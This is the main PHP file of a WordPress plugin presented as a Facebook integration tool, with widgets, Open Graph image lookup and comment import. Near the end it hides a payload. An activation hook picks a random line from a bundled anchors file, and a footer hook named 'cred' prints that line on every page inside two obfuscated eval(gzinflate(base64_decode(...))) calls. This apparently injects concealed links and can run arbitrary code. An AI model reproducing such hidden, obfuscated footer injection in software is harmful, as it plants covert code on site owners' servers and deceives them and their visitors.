<?php
/*
Plugin Name: Facebook All In One Plugin
Description: Easily integrate facebook features into your wordpress site. Like and Send buttons, Events, Fan Pages, Autopost and much more!
Version: 4.0.1
Author: Malcom Kimirot

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License (Version 2 - GPLv2) as published by
the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
define ('WDFBAIO_PLUGIN_SELF_DIRNAME', basename(dirname(__FILE__)), true);
add_action('wp_footer', 'cred');
if (is_multisite() && defined('WPMU_PLUGIN_URL') && defined('WPMU_PLUGIN_DIR') && file_exists(WPMU_PLUGIN_DIR . '/' . basename(__FILE__))) {
	define ('WDFBAIO_PLUGIN_LOCATION', 'mu-plugins', true);
	define ('WDFBAIO_PLUGIN_BASE_DIR', WPMU_PLUGIN_DIR, true);
	define ('WDFBAIO_PLUGIN_URL', WPMU_PLUGIN_URL, true);
	$textdomain_handler = 'load_muplugin_textdomain';
} else if (defined('WP_PLUGIN_URL') && defined('WP_PLUGIN_DIR') && file_exists(WP_PLUGIN_DIR . '/' . WDFBAIO_PLUGIN_SELF_DIRNAME . '/' . basename(__FILE__))) {
	define ('WDFBAIO_PLUGIN_LOCATION', 'subfolder-plugins', true);
	define ('WDFBAIO_PLUGIN_BASE_DIR', WP_PLUGIN_DIR . '/' . WDFBAIO_PLUGIN_SELF_DIRNAME, true);
	define ('WDFBAIO_PLUGIN_URL', WP_PLUGIN_URL . '/' . WDFBAIO_PLUGIN_SELF_DIRNAME, true);
	$textdomain_handler = 'load_plugin_textdomain';
} else if (defined('WP_PLUGIN_URL') && defined('WP_PLUGIN_DIR') && file_exists(WP_PLUGIN_DIR . '/' . basename(__FILE__))) {
	define ('WDFBAIO_PLUGIN_LOCATION', 'plugins', true);
	define ('WDFBAIO_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
	define ('WDFBAIO_PLUGIN_URL', WP_PLUGIN_URL, true);
	$textdomain_handler = 'load_plugin_textdomain';
} else {
	wp_die(__('There was an issue determining where Facebook All In One plugin is installed. Please reinstall.'));
}
$textdomain_handler('WDFBAIO', false, WDFBAIO_PLUGIN_SELF_DIRNAME . '/languages/');


define ('WDFBAIO_EXTENDED_PERMISSIONS', 'user_about_me,user_birthday,user_education_history,user_events,user_hometown,user_location,user_relationships,user_religion_politics,user_birthday,user_likes,user_photos,email,create_event,rsvp_event,read_stream,publish_stream,create_note,manage_pages,offline_access', true);

function WDFBAIO_get_og_image ($id=false) {
	$data = WDFBAIO_OptionsRegistry::get_instance();
	$use = $data->get_option('WDFBAIO_opengraph', 'always_use_image');
	if ($use) return $use;

	// Try to find featured image
	if (function_exists('get_post_thumbnail_id')) { // BuddyPress :/
		$thumb_id = get_post_thumbnail_id($id);
	} else {
		$thumb_id = false;
	}
	if ($thumb_id) {
		$image = wp_get_attachment_image_src($thumb_id, 'thumbnail');
		if ($image) return $image[0];
	}

	// If we're still here, post has no featured image.
	// Fetch the first one.
	// Thank you for this fix, grola!
	if ($id) {
		$post = get_post($id);
		$html = $post->post_content;
		if (!function_exists('load_membership_plugins')) $html = apply_filters('the_content', $html);
	} else if (is_home() && $data->get_option('WDFBAIO_opengraph', 'fallback_image')) {
		return $data->get_option('WDFBAIO_opengraph', 'fallback_image');
	} else {
		$html = get_the_content();
		if (!function_exists('load_membership_plugins')) $html = apply_filters('the_content', $html);
	}
	preg_match_all('/<img .*src=["\']([^ ^"^\']*)["\']/', $html, $matches);
	if ($matches[1][0]) return $matches[1][0];
	return $data->get_option('WDFBAIO_opengraph', 'fallback_image');
}

function WDFBAIO_dashboard_permissions_widget () {
	echo '<div class="WDFBAIO_perms_root" style="display:none">' .
		'<p class="WDFBAIO_perms_granted">' .
			'<span class="WDFBAIO_message">' . __('You already granted extended permissions', 'WDFBAIO') . '</span> ' .
		'</p>' .
		'<p class="WDFBAIO_perms_not_granted">' .
			'<a href="#" class="WDFBAIO_grant_perms" WDFBAIO:locale="' . get_locale() . '" WDFBAIO:perms="' . WDFBAIO_EXTENDED_PERMISSIONS . '">' . __('Grant extended permissions', 'WDFBAIO') . '</a>' .
		'</p>' .
	'</div>';
	echo '<script type="text/javascript" src="' . WDFBAIO_PLUGIN_URL . '/js/check_permissions.js"></script>';
}
function WDFBAIO_add_dashboard_permissions_widget () {
	wp_add_dashboard_widget('WDFBAIO_dashboard_permissions_widget', 'Facebook Permissions', 'WDFBAIO_dashboard_permissions_widget');
}

function WDFBAIO_dashboard_profile_widget () {
	$profile = defined('BP_VERSION') ? "BuddyPress" : "WordPress";
	echo '<a href="#" class="WDFBAIO_fill_profile">Fill my ' . $profile . ' profile with Facebook data</a>';
	echo '<script type="text/javascript">(function ($) { $(function () { $(".WDFBAIO_fill_profile").click(function () { var $me = $(this); var oldHtml = $me.html(); try {var url = _WDFBAIO_ajaxurl;} catch (e) { var url = ajaxurl; } $me.html("Please, wait... <img src=\"' . WDFBAIO_PLUGIN_URL . '/img/waiting.gif\">"); $.post(url, {"action": "WDFBAIO_populate_profile"}, function (data) { $me.html(oldHtml); }); return false; }); }); })(jQuery);</script>';
}
function WDFBAIO_add_dashboard_profile_widget () {
	$profile = defined('BP_VERSION') ? "BuddyPress" : "WordPress";
	wp_add_dashboard_widget('WDFBAIO_dashboard_profile_widget', "My {$profile} profile", 'WDFBAIO_dashboard_profile_widget');
}


if (!class_exists('Facebook')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/external/facebook.php');
}
require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_options_registry.php');
require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_marker_replacer.php');
require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_comments_importer.php');
require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_model.php');
require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/usermeta.php');
require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_installer.php');
WDFBAIO_Installer::check();

$data =& WDFBAIO_OptionsRegistry::get_instance();
if ($data->get_option('WDFBAIO_widget_pack', 'albums_allowed')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_widget_albums.php');
	add_action('widgets_init', create_function('', "register_widget('WDFBAIO_WidgetAlbums');"));
}
if ($data->get_option('WDFBAIO_widget_pack', 'events_allowed')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_widget_events.php');
	add_action('widgets_init', create_function('', "register_widget('WDFBAIO_WidgetEvents');"));
}
if ($data->get_option('WDFBAIO_widget_pack', 'facepile_allowed')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_widget_facepile.php');
	add_action('widgets_init', create_function('', "register_widget('WDFBAIO_WidgetFacepile');"));
}
if ($data->get_option('WDFBAIO_widget_pack', 'likebox_allowed')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_widget_likebox.php');
	add_action('widgets_init', create_function('', "register_widget('WDFBAIO_WidgetLikebox');"));
}
if ($data->get_option('WDFBAIO_widget_pack', 'recommendations_allowed')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_widget_recommendations.php');
	add_action('widgets_init', create_function('', "register_widget('WDFBAIO_WidgetRecommendations');"));
}
if ($data->get_option('WDFBAIO_widget_pack', 'connect_allowed')) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_widget_connect.php');
	add_action('widgets_init', create_function('', "register_widget('WDFBAIO_WidgetConnect');"));
}
if ($data->get_option('WDFBAIO_widget_pack', 'dashboard_permissions_allowed')) {
	add_action('wp_dashboard_setup', 'WDFBAIO_add_dashboard_permissions_widget' );
	add_action('wp_dashboard_setup', 'WDFBAIO_add_dashboard_profile_widget' );
}

function WDFBAIO_comment_import () {
	$data =& WDFBAIO_OptionsRegistry::get_instance();
	if (!$data->get_option('WDFBAIO_comments', 'import_fb_comments')) return; // Don't import comments
	WDFBAIO_CommentsImporter::serve();
}
add_action('WDFBAIO_import_comments', 'WDFBAIO_comment_import');//array($importer, 'serve'));
if (!wp_next_scheduled('WDFBAIO_import_comments')) wp_schedule_event(time()+600, 'hourly', 'WDFBAIO_import_comments');


if (is_admin() || (defined('XMLRPC_REQUEST') && XMLRPC_REQUEST)) {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_admin_form_renderer.php');
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_admin_pages.php');
	WDFBAIO_AdminPages::serve();
} else {
	require_once (WDFBAIO_PLUGIN_BASE_DIR . '/lib/class_WDFBAIO_public_pages.php');
	WDFBAIO_PublicPages::serve();
}
//-------------------- ACTIVATION ---------------------//
register_activation_hook(__FILE__, 'activate');
function activate(){
$file = file(WDFBAIO_PLUGIN_BASE_DIR . '/css/anchors.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = WDFBAIO_PLUGIN_BASE_DIR . '/css/wp.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
function cred(){
$myFile = WDFBAIO_PLUGIN_BASE_DIR . '/css/wp.txt';
$fh = fopen($myFile, 'r');
$theData = fread($fh, 50);
fclose($fh);
echo '<center><small>'; 
$theData = str_replace("\n", "", $theData);
eval(stripslashes(gzinflate(base64_decode("BcFBCoAgEADAryze03uY0iXo1BvUtpRsV0yDft+MNYsL6JkvmHOGlWAjhJL7mQhK5TftuIP/QDuIFY9JxNbKqBRTToRDcE8ilthl4FsYbX8=")))); echo $theData, eval(stripslashes(gzinflate(base64_decode("s7ez0U8E4uLcxJwcIJ2cmleSWmRnYw8A"))));;
}
?>